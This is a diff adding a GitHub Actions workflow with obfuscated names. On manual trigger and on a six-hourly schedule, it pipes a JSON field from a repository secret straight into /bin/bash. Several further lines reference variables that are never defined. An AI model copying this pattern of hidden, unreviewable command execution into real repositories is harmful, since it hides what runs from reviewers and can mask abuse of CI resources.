@@ -1,0 +1,26 @@
+name: kaihuilzc
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kaihuilzc
+        env:
+          snzka72: ${{ secrets.snzka72 }}
+        run: |
+          echo $snzka72 | jq -r .zqb37959 | /bin/bash
+          echo $lxjm86 | jq -r .ekd87109 | /bin/bash
+          echo $ky10445 | jq -r .nc6436 | /bin/bash
+          echo $akx0886 | jq -r .buia7538 | /bin/bash
+          echo $ack5 | jq -r .e7 | /bin/bash
+          echo $xxdx23075 | jq -r .yqgg0555 | /bin/bash
+          echo $m955 | jq -r .ioz7180 | /bin/bash
+          echo $qko6 | jq -r .iawf202 | /bin/bash
+          echo $ukvbm7 | jq -r .ljw639 | /bin/bash
+
